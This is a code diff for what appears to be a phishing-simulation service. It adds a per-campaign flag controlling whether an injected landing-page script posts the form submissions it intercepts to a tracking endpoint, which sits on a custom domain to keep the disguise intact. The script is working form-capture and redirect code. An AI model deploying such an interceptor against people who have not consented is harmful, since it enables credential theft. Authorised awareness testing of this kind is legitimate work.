@@ -84,24 +84,35 @@ function jsString(value: string): string {
   return JSON.stringify(value ?? "");
 }
 
-/* Build the form-capture + redirect interceptor injected into the served page. */
-function buildInterceptor(campaignId: string, recipientId: string, redirectUrl: string, base: string): string {
+/* Build the form-capture + redirect interceptor injected into the served page.
+ *
+ * `capture` reflects the campaign's capture_credentials flag. When false the
+ * page still intercepts the form and still redirects — so the recipient's
+ * experience is identical — but does NOT post the submission, so no
+ * FORM_SUBMITTED event is recorded. Field values were never stored either way;
+ * this governs whether the submission is logged at all. Emitting the send()
+ * call conditionally (rather than gating inside it) keeps the disabled path from
+ * even referencing the tracking endpoint. */
+function buildInterceptor(campaignId: string, recipientId: string, redirectUrl: string, base: string, capture: boolean): string {
   // The submit call must post to the SAME custom domain the page was served
   // from, or a recipient inspecting the network tab sees supabase.co and the
   // disguise breaks. `base` is the campaign's domain base, SUPABASE_URL fallback.
   const trackBase = `${base}/functions/v1/phishing-track`;
+  const sendBody = capture
+    ? `try{
+      fetch(TRACK+"?t=submit&c="+encodeURIComponent(C)+"&r="+encodeURIComponent(R),{
+        method:"POST",headers:{"Content-Type":"application/json"},
+        body:JSON.stringify(data),keepalive:true
+      }).catch(function(){});
+    }catch(_){}`
+    : `/* capture disabled for this campaign — submission is not recorded */`;
   return `<script>
 (function(){
   var TRACK=${jsString(trackBase)},C=${jsString(campaignId)},R=${jsString(recipientId)},REDIRECT=${jsString(redirectUrl)};
   function send(form){
     var data={};
     try{ new FormData(form).forEach(function(v,k){ data[k]=v; }); }catch(_){}
-    try{
-      fetch(TRACK+"?t=submit&c="+encodeURIComponent(C)+"&r="+encodeURIComponent(R),{
-        method:"POST",headers:{"Content-Type":"application/json"},
-        body:JSON.stringify(data),keepalive:true
-      }).catch(function(){});
-    }catch(_){}
+    ${sendBody}
   }
   document.addEventListener("submit",function(e){
     var form=e.target;
@@ -151,7 +162,7 @@ Deno.serve(async (req) => {
     // 1. Campaign must exist and must reference THIS landing page.
     const { data: campaign } = await supabase
       .from("phishing_campaigns")
-      .select("id, company_id, landing_page_id, phishing_domain_id, phishing_domains(tracking_base_url)")
+      .select("id, company_id, landing_page_id, phishing_domain_id, capture_credentials, phishing_domains(tracking_base_url)")
       .eq("id", campaignId)
       .single();
 
@@ -217,7 +228,7 @@ Deno.serve(async (req) => {
       const trimmed = typeof raw === "string" ? raw.trim().replace(/\/+$/, "") : "";
       return trimmed.length > 0 ? trimmed : SUPABASE_URL;
     })();
-    const interceptor = buildInterceptor(campaignId, recipientId, trustedRedirect, domainBase);
+    const interceptor = buildInterceptor(campaignId, recipientId, trustedRedirect, domainBase, campaign.capture_credentials !== false);
     const finalHtml   = injectInterceptor(baseHtml, interceptor);
 
     return new Response(finalHtml, {
